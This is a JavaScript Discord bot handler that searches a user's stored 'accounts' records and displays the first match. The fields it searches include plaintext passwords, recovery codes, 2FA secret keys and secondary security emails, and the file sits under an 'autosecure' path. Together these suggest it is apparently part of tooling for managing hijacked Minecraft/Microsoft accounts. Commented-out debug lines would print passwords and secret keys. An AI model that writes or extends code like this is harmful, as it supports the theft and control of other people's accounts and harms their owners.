const { queryParams } = require("../../../db/database");
const accountsmsg = require('../../../autosecure/utils/accounts/accountsmsg');

module.exports = {
    name: "searchmodal",
    callback: async (client, interaction) => {
        try {
            // console.log(`[INFO] Starting searchmodal callback for user ID: ${interaction.user.id}`);

            const userId = interaction.user.id;
            const searchQuery = interaction.fields.getTextInputValue('searchQuery');
            // console.log(`[INFO] Search query: ${searchQuery}`);

            // Fetch all accounts for the user
            // console.log(`[INFO] Fetching accounts for user ID: ${userId}`);
            const userAccounts = await queryParams(`SELECT * FROM accountsbyuser WHERE user_id=? ORDER BY time DESC`, [userId]);

            if (!userAccounts || userAccounts.length === 0) {
                // console.log(`[WARN] No accounts found for user ID: ${userId}`);
                return interaction.reply({
                    content: "No accounts found to search.",
                    ephemeral: true
                });
            }

            // console.log(`[INFO] Found ${userAccounts.length} accounts for user ID: ${userId}`);

            // Fetch account details and search for matches
            let allAccounts = [];
            // console.log(`[INFO] Fetching account details for ${userAccounts.length} accounts`);
            for (const userAccount of userAccounts) {
                // console.log(`[INFO] Fetching details for account UID: ${userAccount.uid}`);
                const accountDetails = await queryParams(`SELECT * FROM accounts WHERE uid=?`, [userAccount.uid]);
                if (accountDetails && accountDetails.length > 0) {
                    // console.log(`[INFO] Found details for account UID: ${userAccount.uid}`);
                    allAccounts = allAccounts.concat(accountDetails);
                } else {
                    // console.log(`[WARN] No details found for account UID: ${userAccount.uid}`);
                }
            }

            // console.log(`[INFO] Total accounts with details: ${allAccounts.length}`);

            // Search for matching accounts
            // console.log(`[INFO] Searching for accounts matching query: ${searchQuery}`);
            const matchingAccounts = allAccounts.filter(account => {
                // Check all relevant fields for a match
                const matchesUsername = account.username?.toLowerCase().includes(searchQuery.toLowerCase());
                const matchesOwnsMc = account.ownsmc?.toLowerCase().includes(searchQuery.toLowerCase());
                const matchesCapes = account.capes?.toLowerCase().includes(searchQuery.toLowerCase());
                const matchesRecoveryCode = account.recoverycode?.toLowerCase().includes(searchQuery.toLowerCase());
                const matchesEmail = account.email?.toLowerCase().includes(searchQuery.toLowerCase());
                const matchesSecEmail = account.secemail?.toLowerCase().includes(searchQuery.toLowerCase());
                const matchesSecretKey = account.secretkey?.toLowerCase().includes(searchQuery.toLowerCase());
                const matchesPassword = account.password?.toLowerCase().includes(searchQuery.toLowerCase());

                // console.log(`[DEBUG] Account UID: ${account.uid}`);
                // console.log(`[DEBUG] Username: ${account.username}, Matches: ${matchesUsername}`);
                // console.log(`[DEBUG] Owns Minecraft: ${account.ownsmc}, Matches: ${matchesOwnsMc}`);
                // console.log(`[DEBUG] Capes: ${account.capes}, Matches: ${matchesCapes}`);
                // console.log(`[DEBUG] Recovery Code: ${account.recoverycode}, Matches: ${matchesRecoveryCode}`);
                // console.log(`[DEBUG] Primary Email: ${account.email}, Matches: ${matchesEmail}`);
                // console.log(`[DEBUG] Secondary Email: ${account.secemail}, Matches: ${matchesSecEmail}`);
                // console.log(`[DEBUG] Secret Key: ${account.secretkey}, Matches: ${matchesSecretKey}`);
                // console.log(`[DEBUG] Password: ${account.password}, Matches: ${matchesPassword}`);

                return (
                    matchesUsername ||
                    matchesOwnsMc ||
                    matchesCapes ||
                    matchesRecoveryCode ||
                    matchesEmail ||
                    matchesSecEmail ||
                    matchesSecretKey ||
                    matchesPassword
                );
            });

            if (matchingAccounts.length === 0) {
                // console.log(`[WARN] No matching accounts found for query: ${searchQuery}`);
                return interaction.reply({
                    content: "No matching accounts found.",
                    ephemeral: true
                });
            }

            // console.log(`[INFO] Found ${matchingAccounts.length} matching accounts`);

            // Get the UID of the first matching account
            const firstMatchUid = matchingAccounts[0].uid;
            // console.log(`[INFO] First matching account UID: ${firstMatchUid}`);

            // Update the account message to the matching account
            // console.log(`[INFO] Updating message to account with UID: ${firstMatchUid}`);
            const updatedMsg = await accountsmsg(userId, 1, firstMatchUid); // Pass UID as the third parameter
            await interaction.update(updatedMsg);
        } catch (error) {
            console.error("[ERROR] Error in searchmodal_submit:", error);
            return interaction.reply({
                content: "An error occurred while searching for accounts.",
                ephemeral: true
            });
        }
    }
};